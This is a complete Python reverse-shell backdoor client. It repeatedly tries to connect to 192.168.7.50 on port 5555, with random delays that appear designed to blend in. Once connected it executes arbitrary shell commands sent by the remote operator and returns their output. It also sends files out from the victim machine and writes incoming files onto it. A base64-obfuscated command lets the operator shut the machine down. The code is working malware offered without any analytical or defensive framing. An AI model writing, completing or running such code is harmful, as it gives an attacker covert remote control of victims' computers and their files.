import socket
import time
import subprocess
import json
import os
import base64
import random

# ---- Reliable Communication ----
def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data += s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

# ---- File Handling ----
def upload_file(file_name):
    with open(file_name, 'rb') as f:
        s.send(f.read())

def download_file(file_name):
    with open(file_name, 'wb') as f:
        s.settimeout(1)
        try:
            chunk = s.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = s.recv(1024)
                except socket.timeout:
                    break
        finally:
            s.settimeout(None)

# ---- Shutdown Function (Obfuscated) ----
def shut():
    cmd = base64.b64decode(b'c2h1dGRvd24gL3MgL3QgMA==').decode()  # shutdown /s /t 0
    os.system(cmd)

# ---- Shell Session ----
def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'clear':
            continue
        elif command.startswith('cd '):
            os.chdir(command[3:])
        elif command.startswith('download'):
            upload_file(command[9:])
        elif command.startswith('upload'):
            download_file(command[7:])
        elif command == 'poweroff':
            shut()
        else:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            reliable_send(result.stdout + result.stderr)

# ---- Persistent Connection Attempt ----
def connection():
    while True:
        time.sleep(random.randint(15, 30))
        try:
            s.connect(('192.168.7.50', 5555))
            shell()
            s.close()
            break
        except:
            continue

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()